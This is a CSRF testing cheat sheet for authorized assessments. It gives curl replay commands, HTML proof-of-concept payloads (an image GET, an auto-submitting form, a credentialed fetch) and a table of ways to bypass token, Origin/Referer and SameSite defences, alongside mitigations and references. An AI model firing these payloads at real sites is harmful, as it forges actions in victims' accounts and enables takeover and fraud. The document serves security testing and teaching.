# 🍪 CSRF (Cross-Site Request Forgery) Cheat Sheet

> **Quick reference** for testing state-changing requests that lack cross-site protections.

> ⚠️ **Scope note:** Only test applications you own or have explicit written authorization to assess. Use your own two accounts (`<USER_A>`, `<USER_B>`) as victim and attacker; never target real users.

---

### 🧭 **1. Quick Reference**

| Defense | Weak state |
|---------|-----------|
| CSRF token | Missing, static, predictable, or not validated on state change |
| `SameSite` cookie | `None` without `Secure`, or `Lax` with state-changing GET |
| Custom header | Not required, or preflight not enforced |
| `Origin`/`Referer` | Not checked, or check accepts `null`/subdomains |
| Request content type | `text/plain` form accepted by the server |

---

### 🔍 **2. Detection Checklist**

1. Find a state-changing action: email change, password change, transfer, delete.
2. Capture the request and note every parameter, header, and cookie.
3. Remove the CSRF token / custom header and replay — does it still work?
4. Change the `Origin` / `Referer` to `<ATTACKER_ORIGIN>` — is it rejected?
5. Inspect `Set-Cookie` for `SameSite` and `Secure` attributes.

```bash
# Inspect Set-Cookie attributes
curl -sI -c /tmp/csrf_jar.txt 'https://<TARGET>/login' | grep -i '^set-cookie'

# Replay without token or custom header
curl -i -b /tmp/csrf_jar.txt -X POST 'https://<TARGET>/account/email' \
  -d 'email=<USER_B>@example.test'
```

---

### 🧪 **3. Proof-of-Concept Templates**

#### GET-based state change
```html
<img src="https://<TARGET>/account/delete?id=<ID>" width="1" height="1">
```

#### HTML form POST (auto-submit)
```html
<html>
<body>
  <form id="f" action="https://<TARGET>/account/email" method="POST">
    <input type="hidden" name="email" value="<USER_B>@example.test">
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>
```

#### fetch with credentials
```html
<script>
fetch('https://<TARGET>/api/profile', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: '<USER_B>@example.test'})
});
</script>
```

---

### 🧩 **4. Bypass Techniques**

| Obstacle | Test |
|----------|------|
| Token present | Remove parameter entirely; send empty/`null`; reuse `<TOKEN>` from another session |
| Token tied to cookie | Overwrite the cookie via subdomain or response splitting |
| Referer check | Remove header, use `null`, use `https://<TARGET>.<ATTACKER_ORIGIN>` |
| Origin check | Send `Origin: null`, or a trusted subdomain |
| `SameSite=Lax` | Find a state-changing GET, or use a top-level navigation |
| `SameSite=Strict` | Combine with XSS, open redirect, or same-site subdomain |
| Custom header required | Check whether CORS allows your origin to send it |
| Content-type JSON | Retry `application/x-www-form-urlencoded` / `text/plain` |

```bash
# Header manipulation during validation
curl -i -b 'session=<TOKEN_A>' -X POST 'https://<TARGET>/transfer' \
  -H 'Origin: null' \
  -H 'Referer: https://<TARGET>.<ATTACKER_ORIGIN>/' \
  -d 'to=<USER_B>&amount=1'
```

> 💡 A real CSRF PoC must cause a **state change while the victim is logged in** — a `403`/`400` response is not a finding.

---

### 🖥️ **5. Testing Flow**

```bash
# 1. Log in as victim <USER_A>
curl -s -c /tmp/victim.txt -X POST 'https://<TARGET>/login' \
  -d 'username=<USER_A>&password=<PASSWORD>'

# 2. Record pre-state
curl -s -b /tmp/victim.txt 'https://<TARGET>/account'

# 3. Issue the cross-site-style request
curl -i -b /tmp/victim.txt -X POST 'https://<TARGET>/account/email' \
  -d 'email=<USER_B>@example.test'

# 4. Confirm post-state changed
curl -s -b /tmp/victim.txt 'https://<TARGET>/account'
```

---

### 💥 **6. Impact**

- Unauthorized email/password change leading to account takeover.
- Fraudulent transactions, state changes, or data deletion as `<USER_A>`.
- Privilege escalation when admin actions are CSRF-able.
- Silent modification of settings, webhooks, or API keys (never exfiltrate real ones).

---

### 🛡️ **7. Mitigation**

- Use synchronizer tokens per session/request, compared in constant time, on **all** state-changing endpoints.
- Prefer `SameSite=Lax` (or `Strict`) plus `Secure`, `HttpOnly`, and `Path` on session cookies.
- Require a custom header and validate `Origin` (and `Referer` as fallback) against an allow-list.
- Reject `Origin: null` and untrusted subdomains; avoid naive suffix matching.
- Do not use GET for state changes; make handlers method-specific.
- For JSON APIs, enforce `Content-Type: application/json` and CORS allow-listing.
- Re-authenticate for high-risk actions (password, email, MFA changes).

---

### ✅ **8. Testing Checklist**

- [ ] Identified all state-changing endpoints
- [ ] Token removed/reused/empty variants tested
- [ ] `Origin` and `Referer` manipulation tested
- [ ] `SameSite` and `Secure` attributes inspected
- [ ] GET-based state changes tested
- [ ] Content-type downgrade tested
- [ ] PoC verified actual state change with victim session

---

### 📚 **9. References**

- [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger: Cross-site request forgery](https://portswigger.net/web-security/csrf)
- [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)

---

**🍪 Cross-site safely.**
